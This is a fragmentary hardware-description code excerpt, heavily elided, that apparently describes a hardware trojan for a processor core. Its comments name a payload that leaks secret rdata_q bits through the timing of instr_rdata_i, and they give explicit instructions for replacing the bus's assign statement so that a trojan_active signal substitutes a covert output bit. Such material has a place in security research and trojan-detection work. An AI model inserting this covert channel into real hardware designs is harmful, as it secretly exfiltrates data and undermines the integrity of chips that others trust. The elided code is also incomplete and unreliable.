 ...
 * Payload: Modulate instr_rdata_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of instr_rdata_i:
...
logic       covert_bit_out;         // Drives instr_rdata_i when trojan active
...
//   Find the assign for instr_rdata_i (or rd_error_o as fallback):
//     assign instr_rdata_i = <normal_expr>;
//   Replace with:
//     assign instr_rdata_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
